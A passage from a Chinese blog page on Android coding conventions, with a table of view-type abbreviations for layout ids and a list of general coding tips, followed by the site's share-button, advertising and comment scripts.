+<p align="left"><span style="color:rgb(51,51,51)">命名模式：</span><span style="color:rgb(51,51,51)">activity</span><span style="color:rgb(51,51,51)">名称</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">功能模块名称</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">逻辑名称</span><span style="color:rgb(51,51,51)">/activity</span><span style="color:rgb(51,51,51)">名称</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">逻辑名称</span><span style="color:rgb(51,51,51)">/common_</span><span style="color:rgb(51,51,51)">逻辑名称</span></p>
+<p align="left"><span style="color:rgb(51,51,51)">strings.xml</span><span style="color:rgb(51,51,51)">中，使用</span><span style="color:rgb(51,51,51)">activity</span><span style="color:rgb(51,51,51)">名称注释，将文件内容区分开来</span></p>
+<p align="left"><br>
+</p>
+<p align="left"><span style="color:#333333">11 &nbsp; layout</span><span style="color:#333333">中的</span><span style="color:#333333">id</span><span style="color:#333333">命名</span></p>
+<p align="left"><span style="color:#333333">命名模式为：</span><span style="color:#333333">view</span><span style="color:#333333">缩写</span><span style="color:#333333">_</span><span style="color:#333333">模块名称</span><span style="color:#333333">_view</span><span style="color:#333333">的逻辑名称</span></p>
+<p align="left"><span style="color:#333333">view</span><span style="color:#333333">的缩写详情如下：</span></p>
+<p align="left">
+<table border="1" cellspacing="0" cellpadding="0" align="left" width="493">
+<tbody>
+<tr>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">控件</span></strong></p>
+</td>
+<td style="background:#4F81BD">
+<p align="left"><strong><span style="color:white">缩写</span></strong></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">LayoutView</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">lv</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">RelativeView</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">rv</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">TextView</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(51,51,51); background-color:rgb(255,255,255)">tv</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">Button</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">btn</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ImageButton&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">imgBtn</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ImageView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)"><span style="color:rgb(70,70,70)">mgView
+</span><span style="color:rgb(70,70,70)">或则</span><span style="color:rgb(70,70,70)"> iv</span></span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">CheckBox&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">chk</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">RadioButton&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">rdoBtn</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">analogClock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">anaClk</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">DigtalClock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">dgtClk</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">DatePicker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">dtPk</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">EditText &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">edtTxt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">TimePicker &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">tmPk</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">toggleButton &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">tglBtn</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ProgressBar&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">proBar</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">SeekBar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">skBar</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">AutoCompleteTextView</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">autoTxt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ZoomControls&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">zmCtl</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">VideoView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">vdoVi</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">WdbView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">webVi</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">RantingBar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ratBar</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">Tab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">tab</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">Spinner&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">spn</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">Chronometer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">cmt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ScollView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">sclVi</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">TextSwitch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">txtSwt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ImageSwitch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">imgSwt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">listView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="background-color:rgb(255,255,255)"><span style="color:rgb(70,70,70)">lVi
+</span><span style="color:rgb(70,70,70)">或则</span><span style="color:rgb(70,70,70)">lv</span></span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">ExpandableList&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">epdLt</span></p>
+</td>
+</tr>
+<tr>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">MapView&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
+</td>
+<td>
+<p align="left"><span style="color:rgb(70,70,70); background-color:rgb(255,255,255)">mapVi</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<br>
+<p align="left"><br>
+</p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><br>
+</p>
+<p align="left"><span style="color:#333333">12.activity</span><span style="color:#333333">中的</span><span style="color:#333333">view</span><span style="color:#333333">变量命名</span></p>
+<p align="left"><span style="color:#333333">命名模式为：逻辑名称</span><span style="color:#333333">&#43;view</span><span style="color:#333333">缩写</span></p>
+<p align="left"><span style="color:#333333">建议：如果</span><span style="color:#333333">layout</span><span style="color:#333333">文件很复杂，建议将</span><span style="color:#333333">layout</span><span style="color:#333333">分成多个模块，每个模块定义一个</span><span style="color:#333333">moduleViewHolder</span><span style="color:#333333">，其成员变量包含所属</span><span style="color:#333333">view</span></p>
+<p align="left"><span style="color:#333333">13.styles.xml</span><span style="color:#333333">：将</span><span style="color:#333333">layout</span><span style="color:#333333">中不断重现的</span><span style="color:#333333">style</span><span style="color:#333333">提炼出通用的</span><span style="color:#333333">style</span><span style="color:#333333">通用组件，放到</span><span style="color:#333333">styles.xml</span><span style="color:#333333">中；</span></p>
+<p align="left"><span style="color:#333333">14.</span><span style="color:#333333">使用</span><span style="color:#333333">layer-list</span><span style="color:#333333">和</span><span style="color:#333333">selector</span></p>
+<p align="left"><span style="color:#333333"><br>
+</span></p>
+<p align="left"><span style="color:#333333"></span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="font-size:18px"><span style="color:rgb(51,51,51)">Android</span><span style="color:rgb(51,51,51)">编码规范建议（别人弄的觉得蛮有道理）</span></span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">1.java</span><span style="color:rgb(51,51,51)">代码中不出现中文，最多注释中可以出现中文</span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">2.</span><span style="color:rgb(51,51,51)">局部变量命名、静态成员变量命名</span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">只能包含字母，单词首字母除第一个外，都为大写，其他字母都为小写</span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">3.</span><span style="color:rgb(51,51,51)">常量命名</span></p>
+<p align="left" style="color:rgb(70,70,70)"><span style="color:rgb(51,51,51)">只能包含字母和</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">，字母全部大写，单词之间用</span><span style="color:rgb(51,51,51)">_</span><span style="color:rgb(51,51,51)">隔开</span></p>
+<p align="left"><span style="color:#333333">4.</span><span style="color:#333333">图片尽量分拆成多个可重用的图片</span></p>
+<p align="left"><span style="color:#333333">5.</span><span style="color:#333333">服务端可以实现的，就不要放在客户端</span></p>
+<p align="left"><span style="color:#333333">6.</span><span style="color:#333333">引用第三方库要慎重，避免应用大容量的第三方库，导致客户端包非常大</span></p>
+<p align="left"><span style="color:#333333">7.</span><span style="color:#333333">处理应用全局异常和错误，将错误以邮件的形式发送给服务端</span></p>
+<p align="left"><span style="color:#333333">8.</span><span style="color:#333333">图片的</span><span style="color:#333333">.9</span><span style="color:#333333">处理</span></p>
+<p align="left"><span style="color:#333333">9.</span><span style="color:#333333">使用静态变量方式实现界面间共享要慎重</span></p>
+<p align="left"><span style="color:#333333">10.Log(</span><span style="color:#333333">系统名称</span><span style="color:#333333">模块名称</span><span style="color:#333333">接口名称，详细描述</span><span style="color:#333333">)</span></p>
+<p align="left"><span style="color:#333333">11.</span><span style="color:#333333">单元测试（逻辑测试、界面测试）</span></p>
+<p align="left"><span style="color:#333333">12.</span><span style="color:#333333">不要重用父类的</span><span style="color:#333333">handler</span><span style="color:#333333">，对应一个类的</span><span style="color:#333333">handler</span><span style="color:#333333">也不应该让其子类用到，否则会导致</span><span style="color:#333333">message.what</span><span style="color:#333333">冲突</span></p>
+<p align="left"><span style="color:#333333">13.activity</span><span style="color:#333333">中在一个</span><span style="color:#333333">View.OnClickListener</span><span style="color:#333333">中处理所有的逻辑</span></p>
+<p align="left"><span style="color:#333333">14.strings.xml</span><span style="color:#333333">中使用</span><span style="color:#333333">%1$s</span><span style="color:#333333">实现字符串的通配</span></p>
+<p align="left"><span style="color:#333333">15.</span><span style="color:#333333">如果多个</span><span style="color:#333333">Activity</span><span style="color:#333333">中包含共同的</span><span style="color:#333333">UI</span><span style="color:#333333">处理，那么可以提炼一个</span><span style="color:#333333">CommonActivity</span><span style="color:#333333">，把通用部分叫由它来处理，其他</span><span style="color:#333333">activity</span><span style="color:#333333">只要继承它即可</span></p>
+<p align="left"><span style="color:#333333">16.</span><span style="color:#333333">使用</span><span style="color:#333333">button&#43;activitgroup</span><span style="color:#333333">实现</span><span style="color:#333333">tab</span><span style="color:#333333">效果时，使用</span><span style="color:#333333">Button.setSelected(true)</span><span style="color:#333333">，确保按钮处于选择状态，并使</span><span style="color:#333333">activitygroup</span><span style="color:#333333">的当前</span><span style="color:#333333">activity</span><span style="color:#333333">与该</span><span style="color:#333333">button</span><span style="color:#333333">对应</span></p>
+<p align="left"><span style="color:#333333">17.</span><span style="color:#333333">如果所开发的为通用组件，为避免冲突，将</span><span style="color:#333333">drawable/layout/menu/values</span><span style="color:#333333">目录下的文件名增加前缀</span></p>
+<p align="left"><span style="color:#333333">18.</span><span style="color:#333333">数据一定要效验，例如</span></p>
+<p align="left"><span style="color:#333333">字符型转数字型，如果转换失败一定要有缺省&#20540;；</span></p>
+<p><span style="color:rgb(51,51,51)">服务端响应数据是否有效判断</span></p>
+<p><br>
+</p>
+<p><span style="color:rgb(51,51,51)"><br>
+</span></p>
+<p><span style="color:rgb(51,51,51)"><span style="font-size:18px"><strong>&nbsp; &nbsp; &nbsp; 最后，这些都是一些个人总结和网络上看来的其他网友的建议，</strong></span></span></p>
+<p><span style="color:rgb(51,51,51)"></span></p>
+<p align="left"><span style="color:#333333"><span style="font-size:18px"><strong>&nbsp; &nbsp; &nbsp; 仅供参考，只要形成一个团体上的统一即可，简单知道他的意思就可以了。</strong></span></span></p>
+<p align="left"><span style="font-size:18px"><strong><span style="color:#333333">&nbsp; &nbsp; &nbsp; 程序员养成良好的编码习惯和命名规范，对于自己和整个团队都有好处。</span>&nbsp;<br>
+</strong></span></p>
+   
+</div>
+
+
+
+
+<!-- Baidu Button BEGIN -->
+
+
+
+
+<div class="bdsharebuttonbox tracking-ad" style="float: right;" data-mod="popu_172">
+<a href="#" class="bds_more" data-cmd="more" style="background-position:0 0 !important; background-image: url(http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png) !important"></a>
+<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"  style="background-position:0 -52px !important"></a>
+<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"style="background-position:0 -104px !important"></a>
+<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"style="background-position:0 -260px !important"></a>
+<a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"style="background-position:0 -208px !important"></a>
+<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"style="background-position:0 -1612px !important" ></a>
+</div>
+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+<!-- Baidu Button END -->
+
+   <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_detail.css" />
+
+    
+<!--172.16.140.11-->
+
+<!-- Baidu Button BEGIN -->
+<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=1536434" ></script>
+<script type="text/javascript" id="bdshell_js"></script>
+<script type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</script>
+<!-- Baidu Button END -->
+
+ 
+
+
+        <div id="digg" ArticleId="23542617" >
+            <dl id="btnDigg" class="digg digg_disable"  onclick="btndigga();">
+               
+                 <dt>顶</dt>
+                <dd>59</dd>
+            </dl>
+           
+              
+            <dl id="btnBury" class="digg digg_disable"  onclick="btnburya();">
+              
+                  <dt>踩</dt>
+                <dd>1</dd>               
+            </dl>
+            
+        </div>
+     <div class="tracking-ad" data-mod="popu_222"><a href="javascript:void(0);" >&nbsp;</a>   </div>
+    <div class="tracking-ad" data-mod="popu_223"> <a href="javascript:void(0);" >&nbsp;</a></div>
+    <script type="text/javascript">
+                function btndigga() {
+                    $(".tracking-ad[data-mod='popu_222'] a").click();
+                }
+                function btnburya() {
+                    $(".tracking-ad[data-mod='popu_223'] a").click();
+                }
+            </script>
+
+   <ul class="article_next_prev">
+                <li class="prev_article"><span  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian']);location.href='/vipzjyno1/article/details/23206387';">上一篇</span><a href="/vipzjyno1/article/details/23206387" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian'])">Android-Universal-Image-Loader 图片异步加载类库的使用（超详细配置）</a></li>
+                <li class="next_article"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian']);location.href='/vipzjyno1/article/details/23591315';">下一篇</span><a href="/vipzjyno1/article/details/23591315" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian'])">（android高仿系列）今日头条 --新闻阅读器  （一）</a></li>
+    </ul>
+
+    <div style="clear:both; height:10px;"></div>
+
+
+        <div class="similar_article"  style="display:none">
+                <h4>我的同类文章</h4>
+                <div class="similar_c"style="margin:20px 0px 0px 0px">
+                    <div class="similar_c_t">
+                                <label class="similar_cur">
+                                    <span  style="cursor:pointer"  onclick="GetCategoryArticles('2050837','vipzjyno1','foot','23542617');">android<em>（19）</em></span>
+                                </label>
+                    </div>
+                   
+                    <div class="similar_wrap tracking-ad" data-mod="popu_141"  style="max-height:195px;">
+                        <a href="http://blog.csdn.net" style="display:none">http://blog.csdn.net</a>
+                        <ul class="similar_list fl">                          
+                        </ul>
+
+                        <ul class="similar_list fr">                           
+                        </ul>
+                    </div>
+                </div>
+            </div>    
+    <script  type="text/javascript">
+        $(function () {
+            GetCategoryArticles('2050837', 'vipzjyno1','foot','23542617');
+        });
+    </script>
+      
+</div>
+
+     <div>
+             <ins data-revive-zoneid="206" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins> 
+    </div>
+
+<div id="suggest"></div>
+         <script  language="javascript" type='text/javascript'>     
+             $(function(){
+                 $.get("/vipzjyno1/svc/GetSuggestContent/23542617",function(data){
+                     $("#suggest").html(data);
+                 });     
+             });             
+         </script>  
+
+
+<style>
+.blog-ass-articl dd {
+color: #369;
+width: 99%; /*修改行*/
+float: left;
+overflow: hidden;
+font: normal normal 12px/23px "SimSun";
+height: 23px;
+margin: 0;
+padding: 0 0 0 10px;
+margin-right: 30px;
+background: url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;
+}
+</style>
+
+ <link rel="stylesheet" href="http://static.blog.csdn.net/css/replace.css"/>
+<div id="relate" data-mod="popu_218"  class="tracking-ad">
+        <div class="relate_t">
+            <h3><span>参考知识库</span></h3>
+        </div>
+        <div class="relate_c">
+        </div>
+</div>
+ 
+
+<dl class="blog-ass-articl" id="res-relatived" > 
+    <div class="embody embody_b" id="libkeyparent"  style="display:none">
+            <span class="embody_t">更多资料请参考：</span>
+            <div class="embody_c" id="libkey"></div>
+    </div>
+
+
+     <dt><span>猜你在找</span></dt>    
+
+
+   
+
+
+    <div id="adCollege" style="width: 42%;float: left;"> 
+        <script src="http://csdnimg.cn/jobreco/job_reco.js" type="text/javascript"></script> 
+        <script type="text/javascript">
+            csdn.position.showEdu({
+                sourceType: "blog",
+                searchType: "detail",
+                searchKey: "23542617",
+                username: "",
+                recordcount: "5",
+                containerId: "adCollege" //容器DIV的id。 
+            });
+            
+            setEduLoc();
+
+            function setEduLoc() {               
+                var edus = $("#adCollege div dd a");
+                if (edus.length == 0) {
+                    setTimeout(function () {
+                        setEduLoc();
+                    }, 500);
+                }
+                else {
+                    var eduLoc = "?ref=blog&loc=0";
+                    $.each(edus, function (index,item) {
+                        var href = $(this).attr("href") + eduLoc;
+                        $(this).attr("href", href);
+                    });
+                }
+            }
+
+        </script> 
+    </div>  
+
+    
+     <div id="res"  data-mod="popu_36"  class="tracking-ad" style="width: 42%;float: left;margin-right: 30px;"></div>
+   
+</dl>
+
+
+<script type="text/javascript">
+    $(function () {
+        setTimeout(function () {
+            var searchtitletags = 'Android 命名规范 （提高代码可以读性）' + ',' + $("#tags").html();
+            searchService({
+                index: 'blog',
+                query: searchtitletags,
+                from: 5,
+                size: 5,
+                appendTo: '#res',
+                url: 'recommend',
+                his: 2,
+                client: "blog_cf_enhance",
+                tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+            });
+        }, 500);
+    });    
+
+ </script>  
+
+
+    <div id="ad_cen">        
+                      <ins data-revive-zoneid="199" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    </div>  
+
+    <!-- 广告位开始 -->
+    <ins data-revive-zoneid="72" data-revive-id="8c38e720de1c90a6f6ff52f3f89c4d57"></ins>
+    <!-- 广告位结束 -->
+
+<div class="comment_class">
+    <div id="comment_title" class="panel_head">
+        <span class="see_comment">查看评论</span><a name="comments"></a></div>
+    <div id="comment_list">
+    </div>
+    <div id="comment_bar">
+    </div>
+    <div id="comment_form">
+    </div>
+    <div class="announce">
+        * 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<a name="reply"></a><a name="quote"></a></div>
+</div>
+
+<script type="text/javascript">
+    var fileName = '23542617';
+    var commentscount = 31;
+    var islock = false
+</script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/comment.js"></script>
+    <div id="ad_bot">
+    </div>
+<div id="report_dialog">
+</div>
+
+<div id="d-top"  style="bottom:60px;">
+
+        <a id="quick-reply" class="btn btn-top q-reply" title="快速回复" style="display:none;">
+            <img src="http://static.blog.csdn.net/images/blog-icon-reply.png" alt="快速回复">
+        </a>    
+    <a id="d-top-a" class="btn btn-top backtop"  style="display: none;" title="返回顶部" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_huidaodingbu'])" style="">         
+         <img src="http://static.blog.csdn.net/images/top.png" alt="TOP">
+    </a>
+</div>
+<script type="text/javascript">
+    $(function ()
+    {
+        $("#ad_frm_0").height("90px");
+        
+        setTimeout(function(){
+            $("#ad_frm_2").height("200px");
+        },1000);    
+    });
+  
+</script>
+<style type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
